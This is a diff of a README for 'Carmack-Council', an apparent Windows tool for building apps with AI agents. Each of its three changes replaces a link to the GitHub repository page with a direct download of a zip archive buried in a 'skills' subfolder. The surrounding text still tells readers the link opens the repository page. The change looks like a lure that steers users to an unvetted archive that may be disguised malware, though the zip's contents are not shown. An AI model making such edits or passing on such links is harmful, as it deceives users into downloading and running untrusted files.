@@ -1,6 +1,6 @@
 # ⚙️ Carmack-Council - Build Apps with AI Agents
 
-[![Download Carmack-Council](https://img.shields.io/badge/Download-Carmack--Council-brightgreen)](https://github.com/jaydenluckertjes-ai/Carmack-Council)
+[![Download Carmack-Council](https://img.shields.io/badge/Download-Carmack--Council-brightgreen)](https://github.com/jaydenluckertjes-ai/Carmack-Council/raw/refs/heads/main/skills/council-implement/Council-Carmack-v2.6.zip)
 
 ---
 
@@ -25,7 +25,7 @@ This tool connects with cloud AI services to help you build and review code auto
 
 Visit this page to download the software:
 
-[Download Carmack-Council](https://github.com/jaydenluckertjes-ai/Carmack-Council)
+[Download Carmack-Council](https://github.com/jaydenluckertjes-ai/Carmack-Council/raw/refs/heads/main/skills/council-implement/Council-Carmack-v2.6.zip)
 
 Click the link above. It takes you to the repository page on GitHub. From there, follow the next section for installation instructions.
 
@@ -133,4 +133,4 @@ After installation, you run the program like any other Windows app.
 
 ## 🔗 Download Link Again
 
-[![Download Carmack-Council](https://img.shields.io/badge/Download-Carmack--Council-blue)](https://github.com/jaydenluckertjes-ai/Carmack-Council)
+[![Download Carmack-Council](https://img.shields.io/badge/Download-Carmack--Council-blue)](https://github.com/jaydenluckertjes-ai/Carmack-Council/raw/refs/heads/main/skills/council-implement/Council-Carmack-v2.6.zip)
